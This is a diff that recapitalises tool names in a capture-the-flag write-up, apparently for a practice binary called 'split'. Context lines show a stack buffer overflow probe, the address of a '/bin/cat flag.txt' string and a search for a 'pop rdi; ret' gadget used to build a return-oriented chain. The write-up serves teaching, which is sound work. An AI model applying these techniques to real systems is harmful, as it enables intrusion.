@@ -16,7 +16,7 @@ Exiting
 
 ## Static analysis
 
-Using ghidra we can find those functions :
+Using Ghidra we can find those functions :
 
 ```C
 undefined8 main(void)
@@ -56,15 +56,15 @@ Let's exploit this to run the system call in `usefulFunction()` with the `/bin/c
 
 ## Dynamic analysis
 
-Using gdb, we'll find out how many bytes we need to send to modify the return address.  
+Using GDB, we'll find out how many bytes we need to send to modify the return address.  
 
 Let's take a look at the stack after we've send 32 bytes :
 
-```gdb
+```GDB
 gef➤  r <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*32)')
 ```
 
-```gdb
+```GDB
 ────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
 0x00007fffffffda30│+0x0000: 0x4141414141414141	 ← $rsp, $rsi
 0x00007fffffffda38│+0x0008: 0x4141414141414141
@@ -110,7 +110,7 @@ $ python3 cat.py
 6295648
 ```
 
-```gdb
+```GDB
 gef➤  x/s 6295648
 0x601060 <usefulString>:	"/bin/cat flag.txt"
 ```
@@ -124,7 +124,7 @@ $ ROPgadget --binary split | grep rdi
 0x000000000040028a : sar dword ptr [rdi - 0x5133700c], 0x1d ; retf 0xe99e
 ```
 
-```gdb
+```GDB
 gef➤  x/2wi 0x00000000004007c3
    0x4007c3 <__libc_csu_init+99>:	pop    rdi
    0x4007c4 <__libc_csu_init+100>:	ret
